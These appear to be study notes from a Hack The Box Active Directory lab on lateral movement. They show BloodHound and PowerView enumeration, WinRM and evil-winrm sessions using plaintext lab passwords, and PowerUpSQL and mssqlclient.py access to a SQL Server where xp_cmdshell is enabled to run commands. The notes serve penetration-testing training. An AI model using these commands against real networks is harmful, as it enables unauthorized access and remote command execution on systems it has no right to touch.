## Remote Desktop
#### Enumerating the Remote Desktop Users Group

```powershell
PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
```
#### Checking the Domain Users Group's Local Admin & Execution Rights using BloodHound
![](Pasted%20image%2020260530135429.png)
#### Checking Remote Access Rights using BloodHound
![](Pasted%20image%2020260530135455.png)
## WinRM
#### Enumerating the Remote Management Users Group

```powershell
PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
```
#### Using the Cypher Query in BloodHound
![](Pasted%20image%2020260530135739.png)
#### Adding the Cypher Query as a Custom Query in BloodHound
![](Pasted%20image%2020260530135806.png)
#### Establishing WinRM Session from Windows

```powershell
PS C:\htb> $password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
PS C:\htb> $cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred

[ACADEMY-EA-MS01]: PS C:\Users\forend\Documents> hostname 
ACADEMY-EA-MS01
[ACADEMY-EA-MS01]: PS C:\Users\forend\Documents> Exit-PSSession 
PS C:\htb>
```
#### Installing Evil-WinRM

```shell
3kjS@htb[/htb]$ gem install evil-winrm
```
#### Connecting to a Target with Evil-WinRM and Valid Credentials

```shell
3kjS@htb[/htb]$ evil-winrm -i 10.129.201.234 -u forend
```
## SQL Server Admin
#### Using a Custom Cypher Query to Check for SQL Admin Rights in BloodHound
![](Pasted%20image%2020260530140621.png)
#### Enumerating MSSQL Instances with PowerUpSQL

```powershell
PS C:\htb> cd .\PowerUpSQL\ 
PS C:\htb> Import-Module .\PowerUpSQL.ps1 
PS C:\htb> Get-SQLInstanceDomain
```

```powershell
PS C:\htb> Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
```
#### Displaying mssqlclient.py Options

```shell
3kjS@htb[/htb]$ mssqlclient.py
```
#### Running mssqlclient.py Against the Target

```shell
3kjS@htb[/htb]$ mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation
```
#### Choosing enable_xp_cmdshell

```shell
SQL> enable_xp_cmdshell
```
#### Enumerating our Rights on the System using xp_cmdshell

```shell
xp_cmdshell whoami /priv 
output
```
![](Screenshot%202026-05-30%20at%2014.09.07.png)
